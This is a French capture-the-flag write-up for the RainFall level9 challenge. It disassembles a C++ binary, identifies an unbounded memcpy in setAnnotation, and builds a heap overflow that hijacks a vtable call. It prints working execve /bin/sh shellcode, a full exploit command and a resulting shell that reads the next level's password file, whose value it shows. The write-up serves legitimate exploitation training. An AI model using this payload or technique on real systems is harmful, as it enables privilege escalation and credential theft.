# **Level 9**

Pour le `level9`, on explore le code avec `gdb`

```
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax
   0x08048717 <+9>:     mov    %eax,(%esp)
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    0x8(%ebp),%edx
   0x08048722 <+20>:    add    $0x4,%edx
   0x08048725 <+23>:    mov    %eax,0x8(%esp)
   0x08048729 <+27>:    mov    0xc(%ebp),%eax
   0x0804872c <+30>:    mov    %eax,0x4(%esp)
   0x08048730 <+34>:    mov    %edx,(%esp)
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave
   0x08048739 <+43>:    ret
End of assembler dump.
```
Et on decompile le code

```
void main(int param_1,int param_2)
{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  this = (N *)operator_new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator_new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}

void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
```

On comprend rapidement que le code prend le premier input utilisateur, rempli une structure avec un `memcpy` (fonction qui permet l'overflow)
En regardant le code assembleur, on voit un call a `edx`, en remontant un peu, on peut facilement comprendre ce qui ce passe

```
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
```

Donc le code recupere la valeur de `esp+16` puis la `dereference` deux fois

Commençons par trouver la position initial avec l'overflow

```
(gdb) run $(python -c "print'a'*108+'ABCDEFGHIJKLMNOPQRSTUVWXYZ'")
Starting program: /home/user/level9/level9 $(python -c "print'a'*108+'ABCDEFGHIJKLMNOPQRSTUVWXYZ'")

Breakpoint 1, 0x0804867c in main ()
(gdb) si
0x08048680 in main ()
(gdb) x $eax
0x804a078:      0x44434241
```

> Comme `0x44434241` correspond a `ABCD` on sait que l'overflow ce fais juste apres le buffer

Maintenant il n'y a plus qu'a dereferencer l'addresse deux fois et mettre notre `shellcode` prefere pour que notre payload soit complete

On regarde dans la heap ou se trouve notre string

```
(gdb) x/64wx 0x804a078 - 112
0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a078:      0x45444342      0x00000000      0x00000000      0x00000000
```
> On voit qu'elle demarre a `0x0804a00c`

On ecrit notre payload

```
level9@RainFall:~$ ./level9 $(python -c "print'\x10\xa0\x04\x08'+'\x14\xa0\x04\x08'+'\x90'*55+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x0c\xa0\x04\x08'")
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d90672
```

> ### NEXT : [Bonus0](/bonus0/resources/README.md)
